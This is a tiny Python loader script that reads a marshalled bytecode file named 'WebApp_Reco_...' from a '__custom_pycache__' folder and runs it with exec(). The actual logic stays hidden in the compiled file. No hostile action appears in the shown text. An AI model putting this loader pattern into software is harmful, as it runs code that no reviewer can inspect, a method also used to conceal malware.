
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'WebApp_Reco_89b16f7918e84e98bbbd3ca58218de78.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
